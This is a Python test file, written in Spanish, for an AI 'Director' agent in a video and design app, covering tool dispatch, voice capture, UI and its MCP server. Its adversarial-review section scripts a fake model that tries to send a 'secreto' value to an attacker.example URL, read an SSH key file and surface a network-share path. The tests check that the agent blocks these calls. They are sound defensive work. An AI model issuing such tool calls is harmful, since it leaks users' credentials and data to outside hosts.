"""Pruebas del Director IA, el asistente de voz y su luz, sin red ni claves: python -m pruebas.director"""
import base64
import json
import os
import tempfile
import threading
from datetime import datetime
from pathlib import Path

import numpy as np

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
os.environ.setdefault("RAFAGA_IDIOMA", "es")
from PySide6.QtCore import QBuffer, QIODevice  # noqa: E402
from PySide6.QtGui import QColor, QImage  # noqa: E402
from PySide6.QtWidgets import QApplication  # noqa: E402

from motor import claves, diseno, director, edicion, herramientas, ia, nubes, video, voz  # noqa: E402

diseno.asegurar_qt()
app = QApplication.instance()
tmp = Path(tempfile.mkdtemp(prefix="rafaga-director-"))
claves.ARCHIVO, claves.AJUSTES = tmp / "claves.json", tmp / "ajustes.json"  # sin claves: nunca las del usuario


def png(color="#7C5CFF", w=64, h=64) -> bytes:
    imagen = QImage(w, h, QImage.Format_RGB32)
    imagen.fill(QColor(color))
    buf = QBuffer()
    buf.open(QIODevice.WriteOnly)
    imagen.save(buf, "PNG")
    return bytes(buf.data())


# ---------- Imágenes gratis sin clave: el Space de FLUX, sin mandar ningún token ----------
llamadas = []
_space = nubes.llamar_space
nubes.llamar_space = lambda espacio, *e, api_name, **p: llamadas.append((espacio, e, api_name)) or [png(), 7]
try:
    nubes.USO = tmp / "uso.json"
    ia.imagen("una playa", 1080, 1920, tmp / "playa.png")
    assert llamadas and llamadas[0][0] == ia.ESPACIO_IMAGEN and llamadas[0][2] == "/infer", llamadas
    _, entradas, _ = llamadas[0]
    assert entradas[0] == "una playa" and (entradas[3], entradas[4]) == (720, 1280), entradas  # lado largo de 1280
    assert (tmp / "playa.png").read_bytes()[:4] == b"\x89PNG"
    # Si el Space devuelve algo que no es una imagen, se pasa a la siguiente opción (y aquí no hay más)
    nubes.llamar_space = lambda *a, **k: [b"<html>no</html>", 1]
    ia_falla = False
    _pollinations = ia.seguro.descargar
    ia.seguro.descargar = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("sin red en las pruebas"))
    try:
        ia.imagen("otra", 512, 512, tmp / "otra.png")
    except RuntimeError as e:
        ia_falla = "no devolvió una imagen" in str(e)
    finally:
        ia.seguro.descargar = _pollinations
    assert ia_falla
finally:
    nubes.llamar_space = _space

# Cloudflare: solo «prompt» y «steps» (desde 2026 rechaza con 400 cualquier otro campo, como «seed»), y si un
# servicio rechaza algo, el aviso dice su motivo y no solo el código
claves.guardar({"proveedor": "cloudflare", "clave": "0123456789abcdef0123456789abcdef " + "T" * 40,
                "usos": ["imagen"]})
enviado = []
_post_cf = ia.httpx.post
try:
    ia.httpx.post = lambda url, **k: enviado.append(k["json"]) or ia.httpx.Response(
        200, json={"result": {"image": base64.b64encode(png()).decode()}}, request=ia.httpx.Request("POST", url))
    ia.imagen("una playa", 1080, 1920, tmp / "cf.png")
    assert set(enviado[0]) == {"prompt", "steps"}, enviado
    ia.httpx.post = lambda url, **k: ia.httpx.Response(
        400, text='{"errors":[{"message":"Bad input: \'/seed\' not allowed"}]}', request=ia.httpx.Request("POST", url))
    try:
        nubes.rotar("imagen", {"cloudflare": lambda: ia.httpx.post("https://x.example").raise_for_status()})
        raise AssertionError("debió fallar")
    except RuntimeError as e:
        assert "/seed" in str(e) and "not allowed" in str(e), e
finally:
    ia.httpx.post = _post_cf
    claves.borrar("cloudflare")

# ---------- IA gratis sin clave: ve la forma de la respuesta (no el esquema) y no vale copiarla sin rellenar ----------
assert ia._ejemplo({"type": "object", "properties": {
    "n": {"type": "integer"}, "c": {"type": "string", "enum": ["a", "b"]},
    "l": {"type": "array", "items": {"type": "string"}}}}) == {"n": 0, "c": "a | b", "l": ["..."]}


class Respuesta:
    status_code = 200

    def __init__(self, contenido):
        self.contenido = contenido

    def json(self):
        return {"choices": [{"message": {"content": self.contenido}, "finish_reason": "stop"}]}


respuestas = ['{"mensaje": "...", "herramienta": "...", "argumentos": "..."}',  # copió la forma
              '{"type": "object", "properties": {}, "mensaje": "Hola", "herramienta": "", "argumentos": "{}"}']
enviados = []
_post, _dormir = ia.httpx.post, ia.time.sleep
ia.httpx.post = lambda url, **k: enviados.append(k["json"]) or Respuesta(respuestas[len(enviados) - 1])
ia.time.sleep = lambda s: None  # sin esperar los 30 s entre intentos del servicio gratis
try:
    r = ia._texto_gratis("instrucciones", "pedido", director.ESQUEMA)
    assert r["mensaje"] == "Hola" and len(enviados) == 2  # el ejemplo sin rellenar no vale: se pide otra vez
    assert '"required"' not in enviados[0]["messages"][0]["content"]  # no ve el esquema técnico (lo copiaba)
finally:
    ia.httpx.post, ia.time.sleep = _post, _dormir

# ---------- Catálogo: el Director ve las mismas herramientas que el MCP ----------
catalogo = director.catalogo()
for nombre in herramientas.TODAS:
    assert f"- {nombre}(" in catalogo, nombre
assert "-> str" not in catalogo and "formato: str = '9:16'" in catalogo

# Resultados: todo lo que trae archivo y título, en orden y sin datos raros
r = herramientas.resultados(json.dumps({"resultados": [
    {"archivo": "a.mp4", "titulo": "A", "hashtags": ["#x", 3]}, {"archivo": "b.mp4", "titulo": "B"}]}))
assert [x["archivo"] for x in r] == ["a.mp4", "b.mp4"] and r[0]["hashtags"] == ["#x"] and r[1]["descripcion"] == ""
assert herramientas.resultados("ERROR: algo") == [] and herramientas.resultados("[1, 2]") == []


# ---------- El Director: piensa, usa herramientas, corrige errores y se para ----------
def guion(*pasos):
    """Una IA falsa que responde estos pasos en orden y guarda lo que le preguntaron."""
    vistos = []

    def pensar(instrucciones, pedido, esquema):
        assert esquema is director.ESQUEMA and "crear_video(" in instrucciones and "Español" in instrucciones
        vistos.append(pedido)
        return dict(pasos[len(vistos) - 1])
    return pensar, vistos


avisos_de_herramienta = []


def falsa(texto: str, formato: str = "9:16") -> str:
    """Herramienta de prueba."""
    herramientas._aviso()(f"haciendo {texto}", 0.5)
    avisos_de_herramienta.append(texto)
    if texto == "rompe":
        raise RuntimeError("cuota agotada")
    return json.dumps({"formato": formato, "resultados": [{"archivo": f"{texto}.mp4", "titulo": texto}]})


herramientas.TODAS["falsa"] = falsa
_pensar = ia.texto_json
try:
    ia.texto_json, vistos = guion(
        {"mensaje": "Pruebo una que no existe", "herramienta": "borrar_todo", "argumentos": "{}"},
        {"mensaje": "Con argumentos malos", "herramienta": "falsa", "argumentos": '{"otro": 1}'},
        {"mensaje": "JSON roto", "herramienta": "falsa", "argumentos": "{texto:"},
        {"mensaje": "Esta falla", "herramienta": "falsa", "argumentos": '{"texto": "rompe"}'},
        {"mensaje": "Ahora sí", "herramienta": "falsa", "argumentos": '{"texto": "video1", "formato": "16:9"}'},
        {"mensaje": "Listo: te hice el video.", "herramienta": "", "argumentos": "{}"})
    usadas, avisos = [], []
    r = director.dirigir("hazme un video", historial=[{"rol": "usuario", "texto": "hola"},
                                                       {"rol": "director", "texto": "¿qué creamos?"}],
                         aviso=lambda texto, f: avisos.append(texto), al_usar=usadas.append)
    assert r["mensaje"] == "Listo: te hice el video." and r["formato"] == "16:9"
    assert [x["archivo"] for x in r["resultados"]] == ["video1.mp4"]
    assert usadas == ["falsa", "falsa"]  # la que no existe y las de argumentos malos no llegan a usarse
    resultados = [p["resultado"] for p in r["pasos"]]
    assert resultados[0].startswith("ERROR") and "no existe" in resultados[0]
    assert resultados[1].startswith("ERROR: argumentos no válidos") and resultados[2].startswith("ERROR")
    assert resultados[3] == "ERROR: cuota agotada"  # el error vuelve a la IA, que decide qué hacer
    assert "haciendo video1" in avisos  # el progreso de la herramienta llega a la app
    assert "Usuario: hola" in vistos[0] and "Director: ¿qué creamos?" in vistos[0] and "(ninguno todavía)" in vistos[0]
    assert "ERROR: cuota agotada" in vistos[4]  # la IA ve qué pasó en cada paso anterior
    assert herramientas._aviso() is not None and getattr(herramientas._hilo, "aviso", None) is None

    # Nunca más de MAX_PASOS herramientas por pedido, aunque la IA quiera seguir
    ia.texto_json, _ = guion(*[{"mensaje": "otra", "herramienta": "falsa", "argumentos": '{"texto": "x"}'}] * 20)
    avisos_de_herramienta.clear()
    r = director.dirigir("haz muchos")
    assert len(avisos_de_herramienta) == director.MAX_PASOS and "Me detuve" in r["mensaje"]
    try:
        director.dirigir("   ")
        raise AssertionError("un pedido vacío no debe gastar nada")
    except ValueError:
        pass
finally:
    ia.texto_json = _pensar
    del herramientas.TODAS["falsa"]

# ---------- Voz: solo escucha mientras está activa y se para cuando terminas ----------
silencio, hablando = 0.002, 0.2
por_segundo = int(1 / voz.BLOQUE)
assert not voz.hay_que_parar([silencio] * por_segundo)  # 1 s callado: todavía espera
assert voz.hay_que_parar([silencio] * por_segundo * voz.SIN_VOZ)  # 8 s sin decir nada: deja de escuchar
frase = [silencio] * 6 + [hablando] * 2 * por_segundo
assert not voz.hay_que_parar(frase + [silencio] * por_segundo)  # pausa corta entre palabras: sigue
assert voz.hay_que_parar(frase + [silencio] * int(voz.SILENCIO * por_segundo + 1))  # terminó la frase
assert voz.hay_que_parar([hablando] * por_segundo * voz.MAXIMO)  # nunca más de 30 s
ruido = [0.03, 0.035] * por_segundo  # ventilador: el umbral sube con el ruido de la sala
assert not voz.hay_que_parar(ruido + [0.3] * por_segundo + [0.03] * 4)
assert voz.hay_que_parar(ruido + [0.3] * por_segundo + [0.03] * int(voz.SILENCIO * por_segundo + 1))
assert voz.entender(np.zeros(100, np.float32)) == ""  # un clic sin voz no se manda a transcribir


# Escuchar con un micrófono falso: para sola al terminar la frase, o en cuanto se pide
class Micro:
    def __init__(self, niveles, **_):
        self.niveles = list(niveles)

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def read(self, n):
        v = self.niveles.pop(0) if self.niveles else 0.0
        return np.full((n, 1), v, np.float32), False


import sounddevice  # noqa: E402

_entrada = sounddevice.InputStream
try:
    sounddevice.InputStream = lambda **k: Micro(frase + [silencio] * 100)
    niveles = []
    audio = voz.escuchar(threading.Event(), niveles.append)
    assert len(audio) == len(niveles) * int(voz.SR * voz.BLOQUE) and len(niveles) < len(frase) + 100
    assert max(niveles) == 1.0 or max(niveles) > 0.5
    parar = threading.Event()
    parar.set()
    assert len(voz.escuchar(parar)) == 0  # desactivado: no graba nada
finally:
    sounddevice.InputStream = _entrada

# ---------- Herramienta del editor: une fotos y videos y exporta ----------
edicion.CARPETA = tmp / "ediciones"
foto = tmp / "foto.png"
foto.write_bytes(png("#FF4D8D", 320, 320))
musica = tmp / "musica.wav"
video.ffmpeg("-f", "lavfi", "-i", "sine=frequency=440:duration=20", musica)
r = json.loads(herramientas.editar_video([str(foto), str(foto)], nombre="Prueba", formato="1:1", musica=str(musica),
                                         calidad="720p"))
salida = Path(r["resultados"][0]["archivo"])
assert salida.is_file() and abs(video.duracion(salida) - 2 * edicion.IMAGEN) < 0.3, video.duracion(salida)
proyecto = edicion.abrir(Path(r["carpeta"]))  # queda guardado para retocarlo a mano en el editor
assert len(proyecto["clips"]) == 2 and proyecto["audios"][0]["hasta"] <= 2 * edicion.IMAGEN + 0.01
for malo in ([], "no-es-lista", [str(tmp / "no_existe.png")], ["datos/claves.json"]):
    try:
        herramientas.editar_video(malo)
        raise AssertionError(f"debió rechazar {malo!r}")
    except ValueError:
        pass

# ---------- La interfaz: chat, ejemplos, luz y menú que se ilumina ----------
from ui.brillo import Brillo  # noqa: E402
from ui.paginas import director as pagina_director  # noqa: E402
from ui.paginas.director import PaginaDirector  # noqa: E402

pagina = PaginaDirector()
pagina.brillo = Brillo(pagina)
pagina.resize(1100, 900)
pagina.show()
ejemplos = pagina_director.ejemplos()
assert all((pagina_director.EJEMPLOS / f"{e['id']}.mp4").is_file() for e in ejemplos)
disenos_ej = pagina_director.disenos()
assert all((pagina_director.EJEMPLOS / f"{e['id']}.jpg").is_file() for e in disenos_ej)
if disenos_ej:  # los diseños de ejemplo se abren en grande, sin bloquear la app
    from PySide6.QtWidgets import QLabel  # noqa: E402

    from ui.comun import ver_imagen  # noqa: E402
    visor = ver_imagen(pagina, pagina_director.EJEMPLOS / f"{disenos_ej[0]['id']}.jpg", disenos_ej[0]["titulo"])
    assert visor.isVisible() and not visor.findChild(QLabel).pixmap().isNull()
    visor.close()
if ejemplos:
    pagina.ver_ejemplo(ejemplos[0])
    assert pagina.reproductor.isVisible() and pagina.reproductor.resultados[0]["archivo"].endswith(".mp4")
    pagina.reproductor.player.stop()
    # Las tarjetas se mueven con su GIF (si lo tiene y Qt lo lee) y el clic derecho deja su pedido escrito, sin enviar
    from PySide6.QtWidgets import QMenu, QToolButton  # noqa: E402
    tarjetas = [b for b in pagina.findChildren(QToolButton) if b.objectName() == "ejemplo"]
    assert len(tarjetas) == len(ejemplos) + len(disenos_ej)
    for b, e in zip(tarjetas, ejemplos):
        assert bool(b.gif) == (pagina_director.EJEMPLOS / f"{e['id']}.gif").is_file(), e["id"]
    tarjetas[0].findChild(QMenu).actions()[0].trigger()
    assert pagina.pedido.text() == ejemplos[0]["pedido"] and not pagina.ocupado()
    pagina.pedido.clear()

_dirigir = director.dirigir
try:
    director.dirigir = lambda pedido, historial, al_usar, aviso, **_: (
        al_usar("crear_diseno"), aviso("trabajando", 0.5),
        {"mensaje": "Hecho <b>sin HTML</b>", "pasos": [], "formato": "9:16",
         "resultados": [{"archivo": str(salida), "titulo": "Mi video", "descripcion": "", "hashtags": []}]})[-1]
    usadas = []
    pagina.usando.connect(usadas.append)
    pagina.adjuntos = [str(foto)]
    pagina.pedido.setText("hazme un post")
    pagina.enviar()
    assert not pagina.enviar_btn.isEnabled() and pagina.pedido.text() == ""
    pagina.tarea.wait(10_000)
    for _ in range(20):
        app.processEvents()
    assert usadas == ["crear_diseno"] and pagina.enviar_btn.isEnabled()
    texto = pagina.chat.toPlainText()
    assert "Hecho <b>sin HTML</b>" in texto and "foto.png" in texto  # lo de la IA se ve tal cual, nunca como HTML
    assert pagina.historial[0]["rol"] == "usuario" and "foto.png" in pagina.historial[0]["texto"]
    assert pagina.historial[-1] == {"rol": "director", "texto": "Hecho <b>sin HTML</b>"}
    assert pagina.reproductor.isVisible() and pagina.adjuntos == []
    pagina.reproductor.player.stop()
finally:
    director.dirigir = _dirigir

# La luz: se enciende, late con la voz y se apaga sola sin tapar los clics
brillo = pagina.brillo
brillo.poner("escuchando")
brillo.oir(0.9)
for _ in range(10):
    brillo._paso()
assert brillo.isVisible() and brillo.fuerza > 0.5 and brillo.geometry() == pagina.rect()
pagina.grab()  # se pinta sin errores
brillo.poner("hablando")
brillo._paso()
assert brillo.nivel >= 0.35
brillo.poner(None)
for _ in range(60):
    brillo._paso()
assert not brillo.isVisible() and not brillo.reloj.isActive()
pagina.resize(900, 700)
app.processEvents()
assert brillo.geometry() == pagina.rect()  # sigue el tamaño de la ventana

# La ventana: el Director es la primera página y el menú se ilumina en la página que usa
import app as aplicacion  # noqa: E402

ventana = aplicacion.Ventana()
assert ventana.orden[0] is ventana.inicio and ventana.orden[1] is ventana.director  # Inicio va primero
assert ventana.director.brillo is not None
ventana._iluminar("editar_video")
assert [b.text() for b in ventana.grupo.buttons() if b.graphicsEffect()] == ["Editor de video"]
ventana._iluminar(None)
assert not any(b.graphicsEffect() for b in ventana.grupo.buttons())
assert set(pagina_director.PAGINA) == set(herramientas.TODAS)  # cada herramienta tiene su página que iluminar
ventana.close()

# El MCP ofrece exactamente las mismas herramientas
import asyncio  # noqa: E402

import mcp_server  # noqa: E402

assert {h.name for h in asyncio.run(mcp_server.mcp.list_tools())} == set(herramientas.TODAS)

# ---------- Director coherente: elige bien, pasa el pedido entero y deja escribir al especialista ----------
from motor import desde_prompt, diseno_ia, musica, nichos  # noqa: E402

REGLA_FALTAS = ("El pedido lo escribe una persona que puede tener faltas (b/v, s/c/z, ll/y, h que falta, letras "
                "cambiadas). Entiende qué quiso decir: si una palabra tal cual no encaja con el resto del pedido, usa "
                "la parecida que sí encaja (p. ej. «abla» → habla). Nunca cambies el tema. Si dos lecturas son igual "
                "de probables, dilo.")
assert REGLA_FALTAS in director.INSTRUCCIONES
assert "Dibujos animados" in director.INSTRUCCIONES and "estampado" in director.INSTRUCCIONES
assert "escríbelos tú" not in director.INSTRUCCIONES and "DE PAGO" in director.INSTRUCCIONES  # sin pagar sin preguntar
catalogo = director.catalogo()
assert not [o for o in director.OCULTOS if o in catalogo], catalogo  # ni como argumento ni explicados
assert "estampado" in catalogo and "Dibujos animados" in catalogo and "opacidad" not in catalogo
assert "Bachata" in herramientas.crear_cancion.__doc__ and "genero: str = ''" in catalogo
assert "es-DO-RamonaNeural" in herramientas.crear_video.__doc__ and "Lujo cinematográfico" in catalogo
assert "sin red ni país" in catalogo and "estilo: str = 'Cartoon 2D'" in catalogo
# El MCP (un agente de fuera) sigue pudiendo pasar los textos largos
esquemas = {h.name: h for h in asyncio.run(mcp_server.mcp.list_tools())}
assert "propuesta" in esquemas["crear_diseno"].input_schema["properties"] and "guion" in esquemas[
    "crear_video"].input_schema["properties"] and "biblia" in esquemas["crear_serie"].input_schema["properties"]
assert "guion" in esquemas["crear_episodio"].input_schema["properties"]
assert "(0-100)" in esquemas["crear_diseno"].description and "Bachata" in esquemas["crear_cancion"].description

# crear_diseno: entiende primero (contrato de diseno_ia.entender) y pregunta sin gastar si duda
llamado, entendido = {"entender": [], "crear": [], "imagen": []}, {}


def entender_falso(pedido, tipo="auto"):
    llamado["entender"].append((pedido, tipo))
    return dict(entendido)


def crear_falso(pedido, tipo, usar_marca=True, aviso=None, propuesta=None, estilo="auto", calidad="1K"):
    llamado["crear"].append({"pedido": pedido, "tipo": tipo, "propuesta": propuesta, "estilo": estilo})
    return {"tipo": "diseno", "carpeta": "C:/x/d", "archivo": "C:/x/d/vista_previa.png", "titulo": "t"}


guardados = {n: getattr(diseno_ia, n) for n in ("entender", "crear", "ESTILOS")}
_imagen = ia.imagen
diseno_ia.entender, diseno_ia.crear = entender_falso, crear_falso
diseno_ia.ESTILOS = {"auto": "", "vector": "flat vector", "tatuaje": "tattoo flash"}
ia.imagen = lambda *a, **k: llamado["imagen"].append(a)
try:
    entendido.update(entendido="carabela gótica", seguro=False, pregunta="¿Calavera o carabela (barco)?",
                     opciones=["calavera gótica", "carabela gótica (barco)"], tipo="ilustracion", estilo="tatuaje")
    r = json.loads(herramientas.crear_diseno("una carabela gótica"))
    assert r == {"pregunta": "¿Calavera o carabela (barco)?", "opciones": ["calavera gótica", "carabela gótica (barco)"]}
    assert llamado["entender"] == [("una carabela gótica", "auto")] and not llamado["crear"] and not llamado["imagen"]
    # Seguro: diseña lo entendido con el tipo y el estilo que eligió, y lo dice lo primero
    entendido.update(entendido="calavera gótica para camiseta", seguro=True, tipo="estampado")
    r = json.loads(herramientas.crear_diseno("carabela gotica pa una camiseta"))
    assert llamado["crear"][-1] == {"pedido": "calavera gótica para camiseta", "tipo": "estampado", "propuesta": None,
                                    "estilo": "tatuaje"}
    assert list(r)[0] == "entendido" and r["entendido"] == "calavera gótica para camiseta" and r["tipo"] == "diseno"
    herramientas.crear_diseno("calavera", tipo="logo", estilo="vector")  # lo que se pide expresamente manda
    assert llamado["entender"][-1] == ("calavera", "logo") and llamado["crear"][-1]["tipo"] == "logo"
    assert llamado["crear"][-1]["estilo"] == "vector"
    # El Director no puede mandar la propuesta: se quita y el especialista entiende y diseña
    llamado["entender"].clear()
    args, res = director._usar("crear_diseno", json.dumps({"pedido": "logo de mi barbería El Tigre", "tipo": "logo",
                                                           "propuesta": {"titulo": "mío", "capas": []}}),
                               lambda *a: None, lambda n: None, "", "")
    assert args == {"pedido": "logo de mi barbería El Tigre", "tipo": "logo"} and not res.startswith("ERROR"), res
    assert llamado["crear"][-1]["propuesta"] is None and llamado["entender"] == [("logo de mi barbería El Tigre", "logo")]
    # El MCP sí la manda: no se pregunta nada y el tipo automático cae en post
    llamado["entender"].clear()
    herramientas.crear_diseno("x", propuesta={"titulo": "mío"})
    assert not llamado["entender"] and llamado["crear"][-1]["propuesta"] == {"titulo": "mío"}
    assert llamado["crear"][-1]["tipo"] == "post"
    # Sin gastar nada: un tipo que no existe y un pedido vacío (el error lo da el diseñador)
    try:
        herramientas.crear_diseno("calavera", tipo="camiseta")
        raise AssertionError("debió rechazar el tipo")
    except ValueError as e:
        assert "Tipo de diseño desconocido" in str(e) and "logo" in str(e)
    # Desde el Director (sin la validación del MCP), un tipo que no es texto da el error claro, no «unhashable»
    _, res = director._usar("crear_diseno", json.dumps({"pedido": "x", "tipo": ["logo"]}), lambda *a: None,
                            lambda n: None, "", "")
    assert res.startswith("ERROR") and "Tipo de diseño desconocido" in res and "unhashable" not in res, res
    # Un estilo que no existe se rechaza antes de pagar la llamada a entender
    for estilo in ("acuarela", ["vector"]):
        _, res = director._usar("crear_diseno", json.dumps({"pedido": "calavera", "estilo": estilo}),
                                lambda *a: None, lambda n: None, "", "")
        assert "Estilo desconocido" in res and "tatuaje" in res and "unhashable" not in res, res
    herramientas.crear_diseno("   ")
    assert not llamado["entender"] and not llamado["imagen"]
finally:
    ia.imagen = _imagen
    for nombre, valor in guardados.items():
        setattr(diseno_ia, nombre, valor)

# crear_video: una voz inventada falla antes de gastar nada
_generar, generados = desde_prompt.generar, []
desde_prompt.generar = lambda *a, **k: generados.append(a) or {"resultados": []}
try:
    try:
        herramientas.crear_video("un perrito que habla", voz="es-DO-InventadaNeural")
        raise AssertionError("debió rechazar la voz")
    except ValueError as e:
        assert "es-DO-EmilioNeural" in str(e) and not generados
    herramientas.crear_video("un perrito que habla", voz="es-DO-RamonaNeural")
    assert len(generados) == 1
finally:
    desde_prompt.generar = _generar

# investigar_nichos: el tema solo, la red y el país por separado
_investigar = nichos.investigar
nichos.investigar = lambda tema, **k: {"tema": tema, "redes": k["redes"], "pais": k["pais"]}
try:
    assert json.loads(herramientas.investigar_nichos("recetas dominicanas", "Estados Unidos", "TikTok")) == {
        "tema": "recetas dominicanas", "redes": "TikTok", "pais": "Estados Unidos"}
finally:
    nichos.investigar = _investigar

# crear_cancion: sin género lo elige la IA según la idea, y la letra va en el idioma de la idea
_para, _gemini, _proyectos, pedidos_musica, producidos = claves.para, musica._gemini, musica.PROYECTOS, [], []
claves.para = lambda uso: {"proveedor": "gemini", "clave": "falsa", "modelo_musica": "m"}
ia.texto_json = lambda instrucciones, pedido, esquema: pedidos_musica.append((instrucciones, pedido)) or {
    "titulo": "T", "estilo": "sad bachata, female vocals", "letra": "[Chorus] ay", "descripcion": "d", "hashtags": []}
musica._gemini = lambda c, estilo, letra, segundos: producidos.append(estilo) or b"ID3"
try:
    musica.PROYECTOS = tmp / "musica1"
    herramientas.crear_cancion("una bachata triste con voz de mujer")
    assert "elígelo tú según la idea" in pedidos_musica[0][1] and "idioma de la idea" in pedidos_musica[0][0]
    assert producidos == ["sad bachata, female vocals"]  # sin un «. » suelto delante
    musica.PROYECTOS = tmp / "musica2"
    herramientas.crear_cancion("una bachata triste", genero="Bachata")
    assert producidos[-1] == musica.GENEROS["Bachata"] + ". sad bachata, female vocals"
finally:
    claves.para, musica._gemini, musica.PROYECTOS, ia.texto_json = _para, _gemini, _proyectos, _pensar

# ---------- Arreglos de la revisión adversarial ----------
# La IA manda los argumentos como objeto (no como texto): vale igual
assert ia._validar({"mensaje": "m", "herramienta": "x", "argumentos": {"a": 1}}, director.ESQUEMA)["argumentos"] == \
    '{"a": 1}'


def shorts_falso(url: str, formato: str = "9:16", modo: str = "recortar", cantidad: int = 5,
                 duracion_max: int = 60) -> str:
    return json.dumps({"resultados": [{"archivo": "C:/x/short.mp4", "titulo": "Short"}]})


def video_falso(prompt: str, formato: str = "9:16", segundos: int = 45, voz: str = "", imagen: str = "",
                solo_animar: bool = False, guion: dict | None = None) -> str:
    return json.dumps({"resultados": [{"archivo": r"\\atacante.example\s\robo.mp4", "titulo": "Trampa"},
                                      {"archivo": "C:/x/video.mp4", "titulo": "Video"}]})


originales = dict(herramientas.TODAS)
herramientas.TODAS.update(sacar_shorts=shorts_falso, crear_video=video_falso)
try:
    # Enlaces solo del usuario (un texto de terceros no elige servidor); archivos del usuario o del estudio
    ia.texto_json, _ = guion(
        {"mensaje": "a", "herramienta": "sacar_shorts", "argumentos": '{"url": "https://atacante.example/?d=secreto"}'},
        {"mensaje": "b", "herramienta": "sacar_shorts", "argumentos": '{"url": "https://youtu.be/abc"}'},
        {"mensaje": "c", "herramienta": "crear_video", "argumentos": '{"prompt": "x", "imagen": "C:/Users/King/.ssh/id"}'},
        {"mensaje": "d", "herramienta": "crear_video", "argumentos": json.dumps({"prompt": "x", "imagen": r"C:\fotos\yo.png"})},
        {"mensaje": "e", "herramienta": "crear_video", "argumentos": '{"prompt": "x", "imagen": "C:/x/short.mp4"}'},
        {"mensaje": "Listo", "herramienta": "", "argumentos": "{}"})
    pedido = "Saca shorts de https://youtu.be/abc\n\nArchivos que te doy: " + json.dumps([r"C:\fotos\yo.png"])
    r = director.dirigir(pedido)
    res = [p["resultado"] for p in r["pasos"]]
    assert res[0].startswith("ERROR") and "enlaces" in res[0]  # la URL no la escribió el usuario
    assert not res[1].startswith("ERROR")  # la del pedido sí
    assert res[2].startswith("ERROR") and "archivos" in res[2]  # un archivo que nadie dio
    assert not res[3].startswith("ERROR") and not res[4].startswith("ERROR")  # adjunto (escapado en JSON) y del estudio
    assert all("atacante" not in x["archivo"] for x in r["resultados"])  # rutas de red: nunca al reproductor
    assert "Hecho: sacar_shorts → C:/x/short.mp4" in r["resumen"] and "Falló: sacar_shorts" in r["resumen"]
    # El historial recuerda lo hecho: en el pedido siguiente, ese archivo del estudio se puede usar
    ia.texto_json, vistos = guion(
        {"mensaje": "f", "herramienta": "crear_video", "argumentos": '{"prompt": "x", "imagen": "C:/x/short.mp4"}'},
        {"mensaje": "Hecho", "herramienta": "", "argumentos": "{}"})
    r2 = director.dirigir("ahora haz un video con ese short", historial=[
        {"rol": "usuario", "texto": pedido}, {"rol": "director", "texto": "Listo", "hecho": r["resumen"]}])
    assert not r2["pasos"][0]["resultado"].startswith("ERROR") and "C:/x/short.mp4" in vistos[0]
    # Lo que la IA escribió no cuenta como archivo dado: solo el resumen de lo que hizo el estudio
    ia.texto_json, _ = guion(
        {"mensaje": "g", "herramienta": "crear_video", "argumentos": '{"prompt": "x", "imagen": "C:/secreto.png"}'},
        {"mensaje": "Hecho", "herramienta": "", "argumentos": "{}"})
    r3 = director.dirigir("otro", historial=[{"rol": "director", "texto": "usa C:/secreto.png"}])
    assert r3["pasos"][0]["resultado"].startswith("ERROR")
    # Los archivos creados se ven aunque el resultado sea larguísimo
    largo = {"herramienta": "crear_video", "argumentos": {}, "resultado": json.dumps(
        {"relleno": "x" * 5000, "resultados": [{"archivo": "C:/x/final.mp4", "titulo": "t"}]})}
    assert "C:/x/final.mp4" in director._contexto("p", [], [largo])
    # La IA sabe qué día y hora es (para «programa el video para mañana a las 6»)
    assert datetime.now().strftime("%Y-%m-%d") in director._contexto("p", [], [])
    assert "2026-10-25" not in director.catalogo()  # ninguna fecha fija de ejemplo que le sirva de ancla

    # Si la IA falla a mitad, lo ya hecho no se pierde
    llamadas = []

    def falla_a_la_segunda(instrucciones, pedido, esquema):
        llamadas.append(1)
        if len(llamadas) > 1:
            raise RuntimeError("se cayó el servicio")
        return {"mensaje": "voy", "herramienta": "sacar_shorts", "argumentos": '{"url": "https://youtu.be/abc"}'}
    ia.texto_json = falla_a_la_segunda
    r = director.dirigir("shorts de https://youtu.be/abc")
    assert r["resultados"] and "No pude seguir" in r["mensaje"] and "se cayó" in r["mensaje"]
    ia.texto_json = lambda *a: (_ for _ in ()).throw(RuntimeError("sin IA"))
    try:
        director.dirigir("algo")
        raise AssertionError("sin pasos hechos, el error debe llegar al usuario")
    except RuntimeError:
        pass
finally:
    ia.texto_json = _pensar
    herramientas.TODAS.clear()
    herramientas.TODAS.update(originales)

# La voz: el silencio no se manda a transcribir, y lo dicho se entiende siempre en el PC
try:
    sounddevice.InputStream = lambda **k: Micro([silencio] * por_segundo * voz.SIN_VOZ)
    assert len(voz.escuchar(threading.Event())) == 0
finally:
    sounddevice.InputStream = _entrada
_transcribir, pedidos_voz = ia.transcribir, []
ia.transcribir = lambda audio, **k: pedidos_voz.append(k) or [{"palabra": "hola"}]
try:
    assert voz.entender(np.ones(voz.SR, np.float32) * 0.1) == "hola" and pedidos_voz[0]["en_pc"] is True
finally:
    ia.transcribir = _transcribir

# Dos trabajos a la vez en una página: el segundo no suelta al primero (eso tumbaba la app)
import ui.comun as comun  # noqa: E402

_mensaje, avisos_ui = comun.mensaje, []
comun.mensaje = lambda *a, **k: avisos_ui.append(a)
try:
    trabajo = comun.PaginaTrabajo("x", "y")
    soltar = threading.Event()
    boton = comun.boton("ir")
    assert trabajo.lanzar(boton, lambda aviso: soltar.wait(5) and {"resultados": []}) is True
    primera = trabajo.tarea
    assert trabajo.lanzar(boton, lambda aviso: {"resultados": []}) is False and trabajo.tarea is primera
    assert avisos_ui  # se le dice que espere
    soltar.set()
    primera.wait(5000)
finally:
    comun.mensaje = _mensaje

# La respuesta hablada que llega tarde no suena encima: el hilo se deja terminar sin soltarlo
pagina2 = PaginaDirector()
soltar = threading.Event()
pagina2.lectura = comun.Tarea(lambda aviso: soltar.wait(5) and {"archivo": "x.mp3"})
pagina2.lectura.listo.connect(lambda r: avisos_ui.append("sonó"))
pagina2.lectura.start()
viejo = pagina2.lectura
pagina2._soltar_lectura()
assert pagina2.lectura is None and viejo in pagina2._viejas
soltar.set()
viejo.wait(5000)
for _ in range(20):
    app.processEvents()
assert "sonó" not in avisos_ui and viejo not in pagina2._viejas
pagina2.cerrar()
print("Pruebas del Director, la voz y la luz pasadas.")
